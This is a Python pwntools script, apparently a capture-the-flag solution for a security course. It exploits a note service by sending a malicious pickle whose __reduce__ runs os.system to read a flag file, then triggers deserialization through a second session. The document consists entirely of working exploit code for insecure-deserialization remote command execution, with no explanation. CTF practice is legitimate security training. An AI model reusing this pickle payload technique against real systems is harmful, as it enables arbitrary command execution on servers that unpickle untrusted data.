from pwn import remote
import os, time, re, pickle

class RCE:
	def __reduce__(self):
		return os.system, ('cat /home/ctf/flag',)

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23653

read_session = remote(SERVER, PORT, timeout=9999)
write_session = remote(SERVER, PORT, timeout=9999)

# Start session to read the note in Classy mode
read_session.recvuntil(b'name:')
read_session.sendline(b'gui')
read_session.recvuntil(b'>>> ')
read_session.sendline(b'0')

# Start session to write the note in Free mode
write_session.recvuntil(b'name:')
write_session.sendline(b'gui')
write_session.recvuntil(b'>>> ')
write_session.sendline(b'1')

# Write the note
write_session.recvuntil(b'>>> ')
write_session.sendline(b'1')
write_session.recvuntil(b'name:')
write_session.sendline(b'note')
write_session.recvuntil(b'content:')
write_session.sendline(pickle.dumps(RCE()))
write_session.sendline()

time.sleep(0.5) # wait for the note creation to take effect

# Read the note
read_session.recvuntil(b'>>> ')
read_session.sendline(b'0')
read_session.recvuntil(b'name:')
read_session.sendline(b'note')
response = read_session.recvall()

print(re.findall("SSof{.*}", response.decode())[0])
